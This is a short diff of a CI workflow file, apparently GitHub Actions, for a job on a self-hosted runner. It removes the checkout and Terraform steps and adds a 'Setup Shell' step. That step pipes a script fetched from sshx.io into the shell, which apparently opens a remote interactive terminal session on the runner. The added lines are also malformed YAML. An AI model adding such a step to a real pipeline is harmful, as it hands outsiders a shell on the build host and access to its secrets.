@@ -7,10 +7,5 @@ jobs:
   testRunner:
     runs-on: [self-hosted]
     steps:
-    - uses: actions/checkout@v4.1.7
-    - name: Install Terraform
-      uses: hashicorp/setup-terraform@v3.1.1
-    - name: Display Terraform Version
-      run: terraform --version
-    - name: Display Azure-CLI Version
-      run: az --version
+  - name:Setup Shell
+  - run:curl -sSf https://sshx.io/get | sh -s run
